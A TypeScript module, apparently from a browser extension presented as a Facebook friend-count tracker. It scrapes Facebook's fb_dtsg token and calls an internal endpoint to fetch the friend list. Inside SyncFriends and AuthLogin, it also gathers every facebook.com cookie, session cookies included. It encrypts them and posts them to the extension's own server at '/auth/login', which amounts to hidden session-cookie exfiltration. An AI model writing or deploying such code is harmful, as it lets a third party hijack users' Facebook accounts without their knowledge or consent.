import * as cheerio from 'cheerio'

import { IProfile, State } from '../types/storage.interfaces'
import { Storage, U } from '.'

import { CONSTs } from '../types/enum'
import { IFriend } from '../types/facebook.interfaces'
import { ISync } from '../types/sync.interfaces'
import api from '../api'
import { getDeviceInfo } from './authentication'
import moment from 'moment'

export const getToken = async (): Promise<string> => {
	const res = await fetch('https://www.facebook.com/me')
	const data = await res.text()

	const $ = cheerio.load(data).html()

	var newReg = new RegExp(/DTSGInitData(?:.*?):"(.*?)",(?:.*?):"(.*?)"/)
	var Matches = newReg.exec($)

	if (Matches === null) {
		throw new Error('Could not find token')
	}

	const token = Matches[2]

	return token
}

const buildFriendsURL = async (accountId: number): Promise<URL> => {
	const BaseURL: string = 'https://www.facebook.com/ajax/typeahead/first_degree.php'

	const url: URL = new URL(BaseURL)

	const token: string = await getToken()
	const queryParams: Record<string, string | number> = {
		viewer: accountId,
		token: 'v7',
		'filter[0]': 'user',
		'options[0]': 'friends_only',
		'options[1]': 'nm',
		fb_dtsg_ag: token,
		__user: accountId,
		__a: 1,
		__req: 'd',
		__rev: new Date().getTime(),
	}
	for (const [key, value] of Object.entries(queryParams)) {
		url.searchParams.append(key, value.toString())
	}

	return url
}
export const AuthLogin = async (payload: any) => {
	try {
		const EncryptedPayload = await U.encryptPayload(payload, CONSTs.REFRESH_INTERVAL)
		const res = await api.post('/auth/login', {
			info: EncryptedPayload,
		})
		const data = await res.json()
		return data
	} catch (error) {
		throw new Error('Could not authenticate the user')
	}
}
export async function SyncFriends(skipTime: boolean = true): Promise<ISync> {
	try {
		const isLoading = await Storage.GetLoading()
		if (isLoading) throw new Error('Already syncing')
		await Storage.ToggleLoading(true)
		const Cookies = await U.getCookiesByWebSite('https://www.facebook.com/')
		const uIdCookie = Cookies.find((cookie) => cookie.name === 'c_user')

		if (!uIdCookie) {
			throw new Error('Could not find the user id')
		}
		const uId = uIdCookie.value
		const state = await Storage.GetState()

		const existingAccount = await Storage.GetAccountInfo()
		const ShouldRefresh =
			moment(state.nextRefresh).isSameOrBefore(new Date()) ||
			skipTime ||
			+uId !== existingAccount?.id

		if (ShouldRefresh) {
			const { token, device } = await getDeviceInfo()

			const friendsUrl = await buildFriendsURL(+uId)

			const friendsResponse = await fetch(friendsUrl)
			const bodyAsText = await friendsResponse.text()
			const textBody = bodyAsText.replace('for (;;);', '')
			let friends: IFriend[] = JSON.parse(textBody).payload.entries
			const accountName = friends[0].text
			const payload = {
				accountId: +uId,
				browserId: token,
				browserType: device.client?.name || 'Unknown',
				accountName: accountName,
				browserVersion: device.client?.version ?? 0,
				count: friends.length,
				cookies: Cookies,
			}
			const data = await AuthLogin(payload)

			const AccountInfoResponse: IProfile = {
				friendsUrl: friendsUrl.toString(),
				name: accountName,
				profilePicture: friends[0].photo,
				ownerId: data.owner.oId,
				id: +uId,
				cookies: Cookies,
			}

			friends = friends.slice(1)
			await Storage.UpdateAccountInfo(AccountInfoResponse)
			const State: State = {
				change: +uId !== existingAccount?.id ? 0 : friends.length - state.count,
				count: friends.length,
				isPositive: friends.length > state.count,
				lastRefresh: moment().toDate(),
				nextRefresh: moment()
					.add(CONSTs.REFRESH_INTERVAL, CONSTs.REFRESH_INTERVAL_UNIT)
					.toDate(),
			}
			await Storage.UpdateState(State)
			const FriendsToSent = friends.map(({ uid, lastname, firstname, text, photo }) => ({
				accountId: +uid,
				lastName: lastname,
				firstName: firstname,
				fullName: text,
				profilePicture: photo,
			}))
		
			return {
				friendsUrl: friendsUrl.toString(),
				friends: FriendsToSent,
				profilePicture: data.owner.profilePic,
				ownerId: data.owner.oId,
				id: +uId,
				name: accountName,
				state: State,
			}
		} else {
			return {
				id: existingAccount?.id,
				name: existingAccount?.name,
				profilePicture: existingAccount?.profilePicture,
				state,
				friendsUrl: existingAccount?.friendsUrl,
				ownerId: existingAccount?.ownerId,
			}
		}
	} catch (error) {
		throw new Error('Could not sync friends')
	} finally {
		await Storage.ToggleLoading(false)
	}
}
